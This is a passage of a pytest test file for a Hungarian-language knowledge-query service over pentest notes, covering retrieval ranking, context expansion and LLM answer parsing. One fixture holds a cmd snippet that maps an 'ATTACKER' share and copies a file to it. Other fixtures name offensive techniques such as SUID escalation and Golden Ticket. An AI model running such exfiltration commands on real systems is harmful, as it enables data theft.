from datetime import UTC, datetime
from pathlib import Path
from types import SimpleNamespace
from uuid import uuid4
import json

import httpx
import pytest
from fastapi.testclient import TestClient

from app.core.config import Settings
from app.main import create_app
from app.schemas.knowledge import KnowledgeAnswerPayload, KnowledgeQueryRequest
from app.services.knowledge_import import KnowledgeStoredChunk
from app.services.knowledge_indexing import QdrantKnowledgeIndex
from app.services.knowledge_query import (
    build_knowledge_query_user_prompt,
    parse_knowledge_answer_payload,
    parse_knowledge_llm_json_object,
    run_knowledge_query,
    select_knowledge_source_chunks,
)
from app.services.knowledge_retrieval import (
    KnowledgeRetrievedChunk,
    expansion_context_limit_for_seed,
    expansion_priority,
    expand_context_neighbors,
    keyword_knowledge_search,
    merge_hybrid_hits,
    order_retrieved_chunks_for_llm,
    pack_retrieved_chunks_by_document,
    score_heading_relevance,
    score_document_candidates,
    section_context_for_seed,
    semantic_knowledge_search,
)


def _settings() -> Settings:
    return Settings(
        environment="test",
        data_root=Path("/tmp/boberdetective-test"),
        api_prefix="/api/v1",
        database_url="postgresql+psycopg://example",
        llm_provider="lm_studio",
        llm_base_url="http://llm.local/v1",
        llm_api_key="secret",
        llm_chat_model="chat-model",
        llm_embedding_model="embedding-model",
        llm_timeout_seconds=1,
        llm_chat_context_length=112640,
        llm_embedding_context_length=4096,
        llm_eval_batch_size=4096,
        llm_flash_attention=True,
        llm_offload_kv_cache_to_gpu=True,
        llm_auto_load_chat_model=True,
        llm_auto_load_embedding_model=True,
        embedding_batch_size=2,
        pdf_parser="docling_then_pypdf",
        tesseract_cmd="tesseract",
        tesseract_languages="hun+eng",
        max_upload_bytes=1024,
        qdrant_url="http://qdrant.local",
        qdrant_chunk_collection="chunks",
    )


def test_knowledge_query_endpoint_wraps_service_response(monkeypatch) -> None:
    response_payload = _query_response()
    captured = {}

    def fake_run(db, payload):
        captured["payload"] = payload
        return response_payload

    monkeypatch.setattr("app.api.v1.knowledge.run_knowledge_query", fake_run)

    response = TestClient(create_app()).post(
        "/api/v1/knowledge/query",
        json={"question": "Mi a SUID?", "retrieval_strategy": "keyword"},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["answer"]["answer_text"] == "Válasz."
    assert body["used_sources"][0]["heading_path"] == "Linux > SUID"
    assert captured["payload"].question == "Mi a SUID?"


def test_keyword_knowledge_search_uses_markdown_chunks(monkeypatch) -> None:
    document = _document()
    chunks = [
        _chunk("A sudoers nem releváns.", chunk_index=0),
        _chunk("A SUID bináris jogosultságemelési jegyzet.", chunk_index=1, heading_path="Linux > SUID"),
    ]
    monkeypatch.setattr("app.services.knowledge_retrieval.read_knowledge_chunks", lambda item: chunks)

    hits = keyword_knowledge_search([document], "SUID jogosultságemelés", 5)

    assert len(hits) == 1
    assert hits[0].document.id == document.id
    assert hits[0].chunk.heading_path == "Linux > SUID"
    assert hits[0].match_type == "keyword"


def test_keyword_knowledge_search_uses_heading_path_as_retrieval_evidence(monkeypatch) -> None:
    document = _document(original_filename="OWASP_TOP_10.md", relative_path="General_knowledge/OWASP_TOP_10.md")
    chunks = [
        _chunk(
            "Szia! Bevezető szöveg OWASP Top 10 (2021) cheat-sheet stílusban.",
            chunk_index=0,
            heading_path="",
            heading_level=None,
        ),
        _chunk(
            "### **A01: Broken Access Control**\nUsers can act outside of intended permissions.",
            chunk_index=1,
            heading_path="OWASP Top 10 – Cheat Sheet (2021) > **A01: Broken Access Control**",
            heading_level=3,
        ),
        _chunk(
            "### **A02: Cryptographic Failures**\nSensitive data is exposed.",
            chunk_index=2,
            heading_path="OWASP Top 10 – Cheat Sheet (2021) > **A02: Cryptographic Failures**",
            heading_level=3,
        ),
    ]
    monkeypatch.setattr("app.services.knowledge_retrieval.read_knowledge_chunks", lambda item: chunks)

    hits = keyword_knowledge_search([document], "OWASP Top 10 – Cheat Sheet (2021)", 10)

    assert [hit.chunk.chunk_index for hit in hits] == [1, 2, 0]
    assert hits[0].retrieval_score > hits[2].retrieval_score


def test_semantic_knowledge_search_maps_qdrant_hits_to_markdown_chunks(monkeypatch) -> None:
    document = _document()
    first_chunk = _chunk("Első szövegrész.", chunk_index=0)
    second_chunk = _chunk("Második szemantikus találat.", chunk_index=1, heading_path="Windows > CMD")
    captured = {}

    monkeypatch.setattr(
        "app.services.knowledge_retrieval.get_knowledge_index_status",
        lambda db, request: SimpleNamespace(chunk_count=2, is_ready=True, indexed_chunk_count=2, embedding_model="embedding-model"),
    )
    monkeypatch.setattr("app.services.knowledge_retrieval.get_settings", _settings)
    monkeypatch.setattr("app.services.knowledge_retrieval.get_llm_provider", lambda settings: _FakeEmbeddingProvider())
    monkeypatch.setattr("app.services.knowledge_retrieval.read_knowledge_chunks", lambda item: [first_chunk, second_chunk])

    def fake_search(**kwargs):
        captured.update(kwargs)
        return [
            SimpleNamespace(
                knowledge_document_id=document.id,
                chunk_id=second_chunk.chunk_id,
                score=0.91,
                match_type="semantic",
            )
        ]

    monkeypatch.setattr("app.services.knowledge_retrieval.QdrantKnowledgeIndex", lambda settings: SimpleNamespace(search=fake_search))

    hits = semantic_knowledge_search(object(), [document], "CMD fájlmásolás", 5)

    assert captured["query_embedding"] == [0.1, 0.2]
    assert captured["limit"] == 5
    assert captured["document_ids"] == [document.id]
    assert len(hits) == 1
    assert hits[0].label == "source_1"
    assert hits[0].document.id == document.id
    assert hits[0].chunk.chunk_id == second_chunk.chunk_id
    assert hits[0].retrieval_score == 0.91
    assert hits[0].match_type == "semantic"


def test_hybrid_merge_baseline_combines_keyword_semantic_and_overlap_scores() -> None:
    document = _document()
    overlap_chunk = _chunk("CMD net use copy", chunk_index=0)
    semantic_chunk = _chunk("bitsadmin letöltés", chunk_index=1)
    keyword_chunk = _chunk("certutil másolás", chunk_index=2)

    keyword_hits = [
        KnowledgeRetrievedChunk("", document, overlap_chunk, 4.0, "keyword"),
        KnowledgeRetrievedChunk("", document, keyword_chunk, 2.0, "keyword"),
    ]
    semantic_hits = [
        KnowledgeRetrievedChunk("", document, semantic_chunk, 0.9, "semantic"),
        KnowledgeRetrievedChunk("", document, overlap_chunk, 0.8, "semantic"),
    ]

    hits = merge_hybrid_hits(keyword_hits, semantic_hits, 10)

    assert [hit.chunk.chunk_id for hit in hits] == [overlap_chunk.chunk_id, semantic_chunk.chunk_id, keyword_chunk.chunk_id]
    assert [hit.match_type for hit in hits] == ["hybrid", "semantic", "keyword"]
    assert [hit.label for hit in hits] == ["source_1", "source_2", "source_3"]
    assert hits[0].retrieval_score == 0.99
    assert hits[1].retrieval_score == 0.495
    assert hits[2].retrieval_score == 0.175


def test_hybrid_merge_baseline_uses_stable_path_and_chunk_tiebreakers() -> None:
    first_document = _document(original_filename="b.md", relative_path="notes/b.md")
    second_document = _document(original_filename="a.md", relative_path="notes/a.md")
    first_chunk = _chunk("azonos score", chunk_index=2)
    second_chunk = _chunk("azonos score", chunk_index=1)

    hits = merge_hybrid_hits(
        [
            KnowledgeRetrievedChunk("", first_document, first_chunk, 1.0, "keyword"),
            KnowledgeRetrievedChunk("", second_document, second_chunk, 1.0, "keyword"),
        ],
        [],
        10,
    )

    assert [(hit.document.relative_path, hit.chunk.chunk_index) for hit in hits] == [
        ("notes/a.md", 1),
        ("notes/b.md", 2),
    ]


def test_hybrid_merge_adds_markdown_heading_bonus_when_query_matches_heading() -> None:
    document = _document()
    heading_match = _chunk("Általános Windows jegyzet.", chunk_index=2, heading_path="Windows > CMD fájlmásolás")
    text_match = _chunk("CMD fájlmásolás említése heading nélkül.", chunk_index=1, heading_path="Windows")

    hits = merge_hybrid_hits(
        [],
        [
            KnowledgeRetrievedChunk("", document, text_match, 0.5, "semantic"),
            KnowledgeRetrievedChunk("", document, heading_match, 0.5, "semantic"),
        ],
        10,
        query="CMD fájlmásolás",
    )

    assert [hit.chunk.chunk_id for hit in hits] == [heading_match.chunk_id, text_match.chunk_id]
    assert hits[0].retrieval_score > hits[1].retrieval_score


def test_knowledge_user_prompt_exposes_heading_path_context() -> None:
    document = _document(original_filename="OWASP_TOP_10.md", relative_path="General_knowledge/OWASP_TOP_10.md")
    chunk = _chunk(
        "### **A01: Broken Access Control**\nUsers can act outside of intended permissions.",
        chunk_index=1,
        heading_path="OWASP Top 10 – Cheat Sheet (2021) > **A01: Broken Access Control**",
        heading_level=3,
    )

    prompt = build_knowledge_query_user_prompt(
        "OWASP Top 10 – Cheat Sheet (2021)",
        "detailed",
        [KnowledgeRetrievedChunk("source_1", document, chunk, 0.9, "section_context")],
    )

    assert "heading_path: OWASP Top 10 – Cheat Sheet (2021) > **A01: Broken Access Control**" in prompt
    assert "### **A01: Broken Access Control**" in prompt


def test_heading_relevance_score_rewards_higher_level_matching_heading() -> None:
    top_level = _chunk(
        "Kubernetes áttekintés.",
        chunk_index=0,
        heading_path="Kubernetes",
        heading_level=1,
    )
    nested = _chunk(
        "Kubernetes részlet.",
        chunk_index=1,
        heading_path="Technologies > Softwares > Kubernetes",
        heading_level=3,
    )

    top_score = score_heading_relevance(top_level, "mit tudsz a kubernetes pentesting-ről?")
    nested_score = score_heading_relevance(nested, "mit tudsz a kubernetes pentesting-ről?")

    assert top_score.is_heading_seed is True
    assert nested_score.is_heading_seed is True
    assert top_score.level_bonus > nested_score.level_bonus
    assert top_score.score > nested_score.score


def test_heading_relevance_score_does_not_reward_unrelated_heading_level() -> None:
    unrelated = _chunk(
        "Általános tartalom.",
        chunk_index=0,
        heading_path="Windows CMD",
        heading_level=1,
    )

    score = score_heading_relevance(unrelated, "kubernetes pentesting")

    assert score.is_heading_seed is False
    assert score.level_bonus == 0.0
    assert score.score == 0.0


def test_expansion_priority_uses_heading_path_and_filename_beyond_raw_semantic_score() -> None:
    document = _document(
        original_filename="2_KubeCTL_detailed.md",
        relative_path="Technologies_AND_Softwares/Kubernetes/2_KubeCTL_detailed.md",
    )
    chunk = _chunk(
        "kubectl OFFENSIVE SECURITY CHEATSHEET\n(enumeration / visibility / permissions / misconfiguration focus)",
        chunk_index=1,
        heading_path="kubectl OFFENSIVE SECURITY CHEATSHEET",
        heading_level=1,
    )
    hit = KnowledgeRetrievedChunk("", document, chunk, 0.337, "semantic")

    priority = expansion_priority(hit, "Adj egy részletes cheatsheetet kubernetes támadásra")

    assert priority >= 0.8
    assert expansion_context_limit_for_seed(hit, "Adj egy részletes cheatsheetet kubernetes támadásra") == 10


def test_medium_expansion_priority_gets_limited_forward_context() -> None:
    document = _document()
    chunk = _chunk("CMD fájlmásolás rövid találat.", chunk_index=1, heading_path="Windows > CMD")
    hit = KnowledgeRetrievedChunk("", document, chunk, 0.62, "semantic")

    assert expansion_context_limit_for_seed(hit, "általános kérdés") == 6


def test_low_expansion_priority_gets_no_context() -> None:
    document = _document()
    chunk = _chunk("Rövid, bizonytalan találat.", chunk_index=1, heading_path="Windows > CMD")
    hit = KnowledgeRetrievedChunk("", document, chunk, 0.42, "semantic")

    assert expansion_context_limit_for_seed(hit, "általános kérdés") == 0


def test_hybrid_merge_adds_code_bonus_only_for_technical_query_matches() -> None:
    document = _document()
    code_chunk = _chunk(
        "Parancsos fájlmásolás:\n```cmd\nnet use Z: \\\\ATTACKER\\share\ncopy file.txt Z:\\\n```",
        chunk_index=2,
        heading_path="Windows > CMD",
        contains_code_block=True,
        code_languages=["cmd"],
    )
    plain_chunk = _chunk("Általános fájlmásolási leírás.", chunk_index=1, heading_path="Windows")

    hits = merge_hybrid_hits(
        [],
        [
            KnowledgeRetrievedChunk("", document, plain_chunk, 0.5, "semantic"),
            KnowledgeRetrievedChunk("", document, code_chunk, 0.5, "semantic"),
        ],
        10,
        query="CMD net use fájlmásolás",
    )

    assert [hit.chunk.chunk_id for hit in hits] == [code_chunk.chunk_id, plain_chunk.chunk_id]
    assert hits[0].retrieval_score > hits[1].retrieval_score


def test_order_retrieved_chunks_for_llm_uses_document_path_and_chunk_order() -> None:
    document_b = _document(original_filename="b.md", relative_path="notes/b.md")
    document_a = _document(original_filename="a.md", relative_path="notes/a.md")
    a_later = _chunk("A későbbi chunk.", chunk_index=5, heading_path="A > Later")
    a_earlier = _chunk("A korábbi chunk.", chunk_index=2, heading_path="A > Earlier")
    b_chunk = _chunk("B chunk.", chunk_index=0, heading_path="B")

    ordered = order_retrieved_chunks_for_llm(
        [
            KnowledgeRetrievedChunk("source_1", document_b, b_chunk, 0.7, "semantic"),
            KnowledgeRetrievedChunk("source_2", document_a, a_later, 0.9, "semantic"),
            KnowledgeRetrievedChunk("source_3", document_a, a_earlier, 0.8, "semantic"),
        ]
    )

    assert [(hit.label, hit.document.relative_path, hit.chunk.chunk_index) for hit in ordered] == [
        ("source_1", "notes/a.md", 2),
        ("source_2", "notes/a.md", 5),
        ("source_3", "notes/b.md", 0),
    ]


def test_score_document_candidates_uses_top_scores_and_capped_coverage() -> None:
    document = _document()
    candidates = [
        KnowledgeRetrievedChunk("", document, _chunk("0", chunk_index=0), 0.9, "semantic"),
        KnowledgeRetrievedChunk("", document, _chunk("1", chunk_index=1), 0.8, "semantic"),
        KnowledgeRetrievedChunk("", document, _chunk("2", chunk_index=2), 0.7, "semantic"),
        KnowledgeRetrievedChunk("", document, _chunk("3", chunk_index=3), 0.6, "semantic"),
        KnowledgeRetrievedChunk("", document, _chunk("4", chunk_index=4), 0.5, "semantic"),
        KnowledgeRetrievedChunk("", document, _chunk("5", chunk_index=5), 0.4, "semantic"),
        KnowledgeRetrievedChunk("", document, _chunk("6", chunk_index=6), 0.3, "semantic"),
        KnowledgeRetrievedChunk("", document, _chunk("7", chunk_index=7), 0.2, "semantic"),
    ]

    score = score_document_candidates(candidates)

    assert score.document_id == document.id
    assert score.top_score_sum == 2.4
    assert score.coverage_bonus == 0.18
    assert score.score == 2.58
    assert score.candidate_count == 8


def test_pack_retrieved_chunks_by_document_orders_documents_by_score_and_chunks_by_index() -> None:
    high_document = _document(original_filename="high.md", relative_path="notes/high.md")
    low_document = _document(original_filename="low.md", relative_path="notes/low.md")
    high_later = _chunk("Magas dokumentum későbbi része.", chunk_index=5)
    high_earlier = _chunk("Magas dokumentum korábbi része.", chunk_index=2)
    low_chunk = _chunk("Magas egyedi score, de gyenge dokumentum.", chunk_index=0)

    packed = pack_retrieved_chunks_by_document(
        [
            KnowledgeRetrievedChunk("", low_document, low_chunk, 0.95, "semantic"),
            KnowledgeRetrievedChunk("", high_document, high_later, 0.7, "semantic"),
            KnowledgeRetrievedChunk("", high_document, high_earlier, 0.6, "semantic"),
        ],
        10,
    )

    assert [(hit.label, hit.document.relative_path, hit.chunk.chunk_index) for hit in packed] == [
        ("source_1", "notes/high.md", 2),
        ("source_2", "notes/high.md", 5),
        ("source_3", "notes/low.md", 0),
    ]


def test_pack_retrieved_chunks_by_document_deduplicates_same_chunk_with_highest_score() -> None:
    document = _document()
    chunk = _chunk("Duplikalt chunk.", chunk_index=1)

    packed = pack_retrieved_chunks_by_document(
        [
            KnowledgeRetrievedChunk("", document, chunk, 0.2, "section_context"),
            KnowledgeRetrievedChunk("", document, chunk, 0.9, "semantic"),
        ],
        10,
    )

    assert len(packed) == 1
    assert packed[0].label == "source_1"
    assert packed[0].retrieval_score == 0.9
    assert packed[0].match_type == "semantic"


def test_pack_retrieved_chunks_by_document_respects_max_chunks_across_documents() -> None:
    high_document = _document(original_filename="high.md", relative_path="notes/high.md")
    low_document = _document(original_filename="low.md", relative_path="notes/low.md")
    candidates = [
        KnowledgeRetrievedChunk("", high_document, _chunk("0", chunk_index=0), 0.7, "semantic"),
        KnowledgeRetrievedChunk("", high_document, _chunk("1", chunk_index=1), 0.6, "semantic"),
        KnowledgeRetrievedChunk("", high_document, _chunk("2", chunk_index=2), 0.5, "semantic"),
        KnowledgeRetrievedChunk("", low_document, _chunk("0", chunk_index=0), 0.4, "semantic"),
        KnowledgeRetrievedChunk("", low_document, _chunk("1", chunk_index=1), 0.3, "semantic"),
    ]

    packed = pack_retrieved_chunks_by_document(candidates, 4)

    assert [(hit.document.relative_path, hit.chunk.chunk_index) for hit in packed] == [
        ("notes/high.md", 0),
        ("notes/high.md", 1),
        ("notes/high.md", 2),
        ("notes/low.md", 0),
    ]


def test_context_neighbor_expansion_adds_same_heading_neighbors(monkeypatch) -> None:
    document = _document()
    previous_chunk = _chunk("Előzmény magyarázat.", chunk_index=0, heading_path="Windows > CMD")
    seed_chunk = _chunk("CMD copy parancs.", chunk_index=1, heading_path="Windows > CMD")
    next_chunk = _chunk("Következő kódblokk.", chunk_index=2, heading_path="Windows > CMD")

    monkeypatch.setattr("app.services.knowledge_retrieval.read_knowledge_chunks", lambda item: [previous_chunk, seed_chunk, next_chunk])

    expanded = expand_context_neighbors(
        [document],
        [KnowledgeRetrievedChunk("source_1", document, seed_chunk, 0.9, "semantic")],
        8,
    )

    assert [hit.chunk.chunk_index for hit in expanded] == [1, 2]
    assert [hit.match_type for hit in expanded] == ["semantic", "context_neighbor"]


def test_section_context_for_heading_seed_collects_following_compatible_chunks() -> None:
    seed = _chunk("Kubernetes címszakasz.", chunk_index=0, heading_path="Kubernetes", heading_level=1)
    child = _chunk("kubectl leírás.", chunk_index=1, heading_path="Kubernetes > kubectl", heading_level=2)
    same = _chunk("pod security leírás.", chunk_index=2, heading_path="Kubernetes", heading_level=1)
    sibling = _chunk("Docker leírás.", chunk_index=3, heading_path="Docker", heading_level=1)

    context = section_context_for_seed(
        [seed, child, same, sibling],
        seed,
        "mit tudsz a kubernetes pentesting-ről?",
    )

    assert [chunk.chunk_index for chunk in context] == [1, 2]


def test_section_context_for_seed_respects_per_seed_limit() -> None:
    seed = _chunk("Kubernetes címszakasz.", chunk_index=0, heading_path="Kubernetes", heading_level=1)
    chunks = [
        seed,
        _chunk("1", chunk_index=1, heading_path="Kubernetes", heading_level=1),
        _chunk("2", chunk_index=2, heading_path="Kubernetes", heading_level=1),
        _chunk("3", chunk_index=3, heading_path="Kubernetes", heading_level=1),
    ]

    context = section_context_for_seed(chunks, seed, "kubernetes", per_seed_limit=2)

    assert [chunk.chunk_index for chunk in context] == [1, 2]


def test_section_context_for_seed_requires_heading_relevance() -> None:
    seed = _chunk("Kubernetes címszakasz.", chunk_index=0, heading_path="Kubernetes", heading_level=1)
    child = _chunk("kubectl leírás.", chunk_index=1, heading_path="Kubernetes > kubectl", heading_level=2)

    context = section_context_for_seed([seed, child], seed, "windows cmd")

    assert context == []


def test_context_expansion_prefers_section_context_for_heading_seed(monkeypatch) -> None:
    document = _document()
    seed = _chunk("Kubernetes címszakasz.", chunk_index=0, heading_path="Kubernetes", heading_level=1)
    first = _chunk("kubectl leírás.", chunk_index=1, heading_path="Kubernetes > kubectl", heading_level=2)
    second = _chunk("cluster leírás.", chunk_index=2, heading_path="Kubernetes > Cluster", heading_level=2)
    outside = _chunk("Docker leírás.", chunk_index=3, heading_path="Docker", heading_level=1)
    monkeypatch.setattr("app.services.knowledge_retrieval.read_knowledge_chunks", lambda item: [seed, first, second, outside])

    expanded = expand_context_neighbors(
        [document],
        [KnowledgeRetrievedChunk("source_1", document, seed, 0.9, "semantic")],
        8,
        query="kubernetes pentesting",
    )

    assert [hit.chunk.chunk_index for hit in expanded] == [0, 1, 2]
    assert [hit.match_type for hit in expanded] == ["semantic", "section_context", "section_context"]


def test_context_expansion_bridges_pre_heading_seed_to_next_matching_heading(monkeypatch) -> None:
    document = _document(original_filename="OWASP_TOP_10.md", relative_path="General_knowledge/OWASP_TOP_10.md")
    intro = _chunk(
        "Szia! Íme egy OWASP Top 10 (2021) cheat-sheet stílusú összefoglaló.",
        chunk_index=0,
        heading_path="",
        heading_level=None,
    )
    first = _chunk(
        "### **A01: Broken Access Control**\nUsers can act outside of intended permissions.",
        chunk_index=1,
        heading_path="OWASP Top 10 – Cheat Sheet (2021) > **A01: Broken Access Control**",
        heading_level=3,
    )
    second = _chunk(
        "### **A02: Cryptographic Failures**\nSensitive data is exposed.",
        chunk_index=2,
        heading_path="OWASP Top 10 – Cheat Sheet (2021) > **A02: Cryptographic Failures**",
        heading_level=3,
    )
    outside = _chunk(
        "Másik jegyzet.",
        chunk_index=3,
        heading_path="Docker > Basics",
        heading_level=2,
    )
    monkeypatch.setattr("app.services.knowledge_retrieval.read_knowledge_chunks", lambda item: [intro, first, second, outside])

    expanded = expand_context_neighbors(
        [document],
        [KnowledgeRetrievedChunk("source_1", document, intro, 1.04, "hybrid")],
        8,
        query="OWASP Top 10 – Cheat Sheet (2021)",
    )

    assert [hit.chunk.chunk_index for hit in expanded] == [0, 1, 2]
    assert [hit.match_type for hit in expanded] == ["hybrid", "heading_bridge", "heading_bridge"]


def test_context_expansion_does_not_bridge_pre_heading_seed_to_unrelated_heading(monkeypatch) -> None:
    document = _document()
    intro = _chunk("OWASP említés egy bevezetőben.", chunk_index=0, heading_path="", heading_level=None)
    unrelated = _chunk("Docker alapok.", chunk_index=1, heading_path="Docker > Basics", heading_level=2)
    monkeypatch.setattr("app.services.knowledge_retrieval.read_knowledge_chunks", lambda item: [intro, unrelated])

    expanded = expand_context_neighbors(
        [document],
        [KnowledgeRetrievedChunk("source_1", document, intro, 1.04, "hybrid")],
        8,
        query="OWASP Top 10 – Cheat Sheet (2021)",
    )

    assert [hit.chunk.chunk_index for hit in expanded] == [0]


def test_context_neighbor_expansion_skips_incompatible_heading(monkeypatch) -> None:
    document = _document()
    previous_chunk = _chunk("Előzmény magyarázat.", chunk_index=0, heading_path="Windows > CMD")
    seed_chunk = _chunk("CMD copy parancs.", chunk_index=1, heading_path="Windows > CMD")
    next_chunk = _chunk("Másik témakör.", chunk_index=2, heading_path="Linux > SUID")

    monkeypatch.setattr("app.services.knowledge_retrieval.read_knowledge_chunks", lambda item: [previous_chunk, seed_chunk, next_chunk])

    expanded = expand_context_neighbors(
        [document],
        [KnowledgeRetrievedChunk("source_1", document, seed_chunk, 0.9, "semantic")],
        8,
    )

    assert [hit.chunk.chunk_index for hit in expanded] == [1]
    assert all(hit.document.id == document.id for hit in expanded)


def test_context_neighbor_expansion_respects_max_chunks(monkeypatch) -> None:
    document = _document()
    chunks = [
        _chunk("0", chunk_index=0, heading_path="Windows > CMD"),
        _chunk("1", chunk_index=1, heading_path="Windows > CMD"),
        _chunk("2", chunk_index=2, heading_path="Windows > CMD"),
        _chunk("3", chunk_index=3, heading_path="Windows > CMD"),
    ]
    monkeypatch.setattr("app.services.knowledge_retrieval.read_knowledge_chunks", lambda item: chunks)

    expanded = expand_context_neighbors(
        [document],
        [
            KnowledgeRetrievedChunk("source_1", document, chunks[1], 0.9, "semantic"),
            KnowledgeRetrievedChunk("source_2", document, chunks[3], 0.8, "semantic"),
            KnowledgeRetrievedChunk("source_3", document, chunks[0], 0.7, "semantic"),
        ],
        4,
    )

    assert len(expanded) == 4
    assert [hit.chunk.chunk_index for hit in expanded] == [0, 1, 2, 3]


def test_semantic_selection_reserves_room_for_context_neighbors(monkeypatch) -> None:
    document = _document()
    seed_chunk = _chunk("CMD copy parancs.", chunk_index=1, heading_path="Windows > CMD")
    captured = {}

    monkeypatch.setattr("app.services.knowledge_query._knowledge_documents", lambda db, document_ids: [document])
    monkeypatch.setattr("app.services.knowledge_retrieval.read_knowledge_chunks", lambda item: [seed_chunk])

    def fake_semantic_search(db, documents, query, limit):
        captured["limit"] = limit
        return [KnowledgeRetrievedChunk("source_1", document, seed_chunk, 0.9, "semantic")]

    monkeypatch.setattr("app.services.knowledge_query.semantic_knowledge_search", fake_semantic_search)

    hits = select_knowledge_source_chunks(
        object(),
        KnowledgeQueryRequest(question="CMD fájlmásolás", retrieval_strategy="semantic", max_chunks=8),
    )

    assert captured["limit"] == 4
    assert [hit.chunk.chunk_index for hit in hits] == [1]


def test_qdrant_knowledge_search_filters_knowledge_payload() -> None:
    document_id = uuid4()
    chunk_id = str(uuid4())
    captured_payload = {}

    def handler(request: httpx.Request) -> httpx.Response:
        captured_payload.update(json.loads(request.content))
        return httpx.Response(
            200,
            json={"result": [{"score": 0.88, "payload": {"knowledge_document_id": str(document_id), "chunk_id": chunk_id}}]},
        )

    client = httpx.Client(base_url="http://qdrant.local", transport=httpx.MockTransport(handler))

    hits = QdrantKnowledgeIndex(_settings(), client).search(
        query_embedding=[0.1, 0.2],
        limit=3,
        document_ids=[document_id],
    )

    assert hits[0].knowledge_document_id == document_id
    assert hits[0].chunk_id == chunk_id
    assert captured_payload["filter"]["must"][0]["key"] == "document_kind"
    assert captured_payload["filter"]["must"][1]["key"] == "is_current"
    assert captured_payload["filter"]["must"][2]["key"] == "knowledge_document_id"
    assert "case_id" not in json.dumps(captured_payload)


def test_build_knowledge_query_user_prompt_includes_heading_sources() -> None:
    prompt = build_knowledge_query_user_prompt(
        "Mi a SUID?",
        "detailed",
        [KnowledgeRetrievedChunk("source_1", _document(), _chunk("SUID szöveg.", heading_path="Linux > SUID"), 1.0, "keyword")],
    )

    assert "QUERY:\nMi a SUID?" in prompt
    assert "ANSWER_MODE:\ndetailed" in prompt
    assert "[source_1]" in prompt
    assert "document: note.md" in prompt
    assert "heading_path: Linux > SUID" in prompt
    assert "SUID szöveg." in prompt


def test_knowledge_system_prompt_puts_answer_text_last() -> None:
    from app.services.knowledge_query import KNOWLEDGE_QUERY_SYSTEM_PROMPT

    expected_shape = '{"source_summary":"...","insufficient_source":false,"answer_text":"..."}'
    assert expected_shape in KNOWLEDGE_QUERY_SYSTEM_PROMPT
    assert KNOWLEDGE_QUERY_SYSTEM_PROMPT.index("- source_summary:") < KNOWLEDGE_QUERY_SYSTEM_PROMPT.index("- answer_text:")


def test_parse_knowledge_answer_payload_accepts_string_insufficient_source() -> None:
    payload = parse_knowledge_answer_payload(
        {"answer_text": "Válasz.", "source_summary": "", "insufficient_source": "false"},
        "detailed",
    )

    assert payload.insufficient_source is False


def test_parse_knowledge_answer_payload_defaults_missing_optional_fields() -> None:
    payload = parse_knowledge_answer_payload({"answer_text": "Válasz."}, "detailed")

    assert payload.answer_text == "Válasz."
    assert payload.source_summary == ""
    assert payload.insufficient_source is False


def test_parse_knowledge_llm_json_object_recovers_unescaped_newline() -> None:
    parsed = parse_knowledge_llm_json_object(
        '{"answer_text":"Első sor\nMásodik sor","source_summary":"Forrás.","insufficient_source":false}'
    )

    assert parsed["answer_text"] == "Első sor\nMásodik sor"
    assert parsed["insufficient_source"] is False


def test_parse_knowledge_llm_json_object_accepts_answer_text_only() -> None:
    parsed = parse_knowledge_llm_json_object('{"answer_text":"Válasz sok `cmd` és \\\\ karakterrel."}')
    payload = parse_knowledge_answer_payload(parsed, "detailed")

    assert payload.answer_text == "Válasz sok `cmd` és \\ karakterrel."
    assert payload.source_summary == ""
    assert payload.insufficient_source is False


def test_parse_knowledge_llm_json_object_recovers_answer_text_without_optional_fields() -> None:
    parsed = parse_knowledge_llm_json_object('{"answer_text":"Első sor\nMásodik sor "idézett" résszel"}')
    payload = parse_knowledge_answer_payload(parsed, "detailed")

    assert "Első sor" in payload.answer_text
    assert "idézett" in payload.answer_text
    assert payload.insufficient_source is False


def test_parse_knowledge_llm_json_object_recovers_missing_final_brace() -> None:
    parsed = parse_knowledge_llm_json_object(
        '{"source_summary":"Kerberos források.","insufficient_source":false,"answer_text":"AS-REP Roasting\\nGolden Ticket"'
    )
    payload = parse_knowledge_answer_payload(parsed, "detailed")

    assert payload.source_summary == "Kerberos források."
    assert payload.insufficient_source is False
    assert payload.answer_text == "AS-REP Roasting\nGolden Ticket"


def test_parse_knowledge_llm_json_object_recovers_unterminated_final_answer_text() -> None:
    parsed = parse_knowledge_llm_json_object(
        '{"source_summary":"API forrás.","insufficient_source":false,"answer_text":"Példa:\\n\\n```http\n'
        "GET /api/key HTTP/1.1\n"
        "Host: 127.0.0.1\n"
        "```"
    )
    payload = parse_knowledge_answer_payload(parsed, "detailed")

    assert payload.source_summary == "API forrás."
    assert payload.insufficient_source is False
    assert "GET /api/key HTTP/1.1" in payload.answer_text
    assert payload.answer_text.endswith("```")


def test_run_knowledge_query_returns_placeholder_without_sources(monkeypatch) -> None:
    monkeypatch.setattr("app.services.knowledge_query.select_knowledge_source_chunks", lambda db, payload: [])

    response = run_knowledge_query(object(), KnowledgeQueryRequest(question="Nincs ilyen", retrieval_strategy="keyword"))

    assert response.answer.insufficient_source is True
    assert response.used_sources == []
    assert response.retrieval_metadata.selected_chunk_count == 0
    assert response.can_save is False


def _query_response():
    from app.schemas.knowledge import KnowledgeQueryResponse, KnowledgeRetrievalMetadata, KnowledgeUsedSource

    return KnowledgeQueryResponse(
        answer=KnowledgeAnswerPayload(
            answer_text="Válasz.",
            source_summary="Forrás.",
            insufficient_source=False,
            answer_mode="detailed",
        ),
        used_sources=[
            KnowledgeUsedSource(
                knowledge_document_id=uuid4(),
                original_filename="note.md",
                relative_path="notes/note.md",
                chunk_id=str(uuid4()),
                chunk_index=0,
                heading_path="Linux > SUID",
                quote_preview="SUID szöveg.",
            )
        ],
        retrieval_metadata=KnowledgeRetrievalMetadata(
            retrieval_strategy="keyword",
            max_chunks=30,
            selected_chunk_count=1,
            document_count=1,
        ),
    )


class _FakeEmbeddingProvider:
    def embeddings(self, model: str, texts: list[str]):
        return SimpleNamespace(embeddings=[[0.1, 0.2] for _ in texts])


def _document(*, original_filename: str = "note.md", relative_path: str = "notes/note.md") -> SimpleNamespace:
    return SimpleNamespace(
        id=uuid4(),
        original_filename=original_filename,
        relative_path=relative_path,
        document_kind="markdown_note",
        processing_status="processed",
        imported_at=datetime.now(UTC),
    )


def _chunk(
    text: str,
    *,
    chunk_id: str | None = None,
    chunk_index: int = 0,
    heading_path: str = "Linux",
    heading_level: int = 2,
    contains_code_block: bool = False,
    code_languages: list[str] | None = None,
) -> KnowledgeStoredChunk:
    return KnowledgeStoredChunk(
        chunk_id=chunk_id or str(uuid4()),
        chunk_index=chunk_index,
        heading_path=heading_path,
        heading_level=heading_level,
